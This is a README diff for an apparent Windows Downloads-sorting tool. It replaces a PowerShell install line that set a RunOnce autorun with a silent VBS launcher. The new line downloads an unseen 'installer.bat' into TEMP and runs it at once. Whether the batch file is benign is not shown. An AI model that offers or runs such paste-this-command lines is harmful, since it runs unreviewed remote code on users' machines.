@@ -9,10 +9,10 @@ a silent VBS launcher.
 
 ## One-Liner Install
 
-Open **PowerShell** (Win + R -> type `powershell` -> Enter) and paste:
+Open **PowerShell** (Win + R ->) and paste:
 
-```powershell
-$d="$env:LOCALAPPDATA\SortFolder";New-Item -ItemType Directory -Path $d -Force|Out-Null;irm https://raw.githubusercontent.com/drnx64/Folder-Sorter/main/SortDownloadsFolder.ps1 -OutFile "$d\SortDownloadsFolder.ps1";irm https://raw.githubusercontent.com/drnx64/Folder-Sorter/main/run-silent.vbs -OutFile "$d\run-silent.vbs";reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v SortDownloads /t REG_SZ /d "wscript.exe `"$d\run-silent.vbs`"" /f;wscript.exe "$d\run-silent.vbs"
+```
+powershell -NoProfile -Command "iwr 'https://raw.githubusercontent.com/drnx64/Folder-Sorter/refs/heads/main/installer.bat' -OutFile $env:TEMP\installer.bat; Start-Process $env:TEMP\installer.bat"
 ```
 
 What it does:
